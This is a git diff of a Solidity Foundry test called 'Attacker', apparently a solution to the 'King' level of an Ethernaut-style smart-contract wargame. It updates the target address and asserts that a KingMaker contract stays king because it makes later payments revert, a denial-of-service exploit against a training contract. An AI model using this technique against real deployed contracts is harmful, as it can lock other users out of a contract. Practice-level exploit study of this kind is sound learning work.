@@ -6,20 +6,17 @@ import "../instances/Ilevel09.sol";
 import "../src/level09.sol";
 
 contract Attacker is Test {
-    King level09 = King(payable(0x3d8A1317A91B2b9f53A108E00dA27aa2DacD7d90));
+    King level09 = King(payable(0x9BED8AD934C870b0a0ebbf882349631f19468cB8));
 
     function test() external {
         uint256 prize = level09.prize();
 
         vm.deal(address(this), 2 * prize);
-        KingMaker kingMaker = (new KingMaker){value: prize}();
+        KingMaker kingMaker = (new KingMaker){value: prize}(address(level09));
 
-        assertEq(level09._king(), address(kingMaker));
-
-        vm.expectRevert("EvmError: Revert");
         (bool success,) = address(level09).call{value: prize}("");
-
         assert(!success);
+
         assertEq(level09._king(), address(kingMaker));
     }
 }
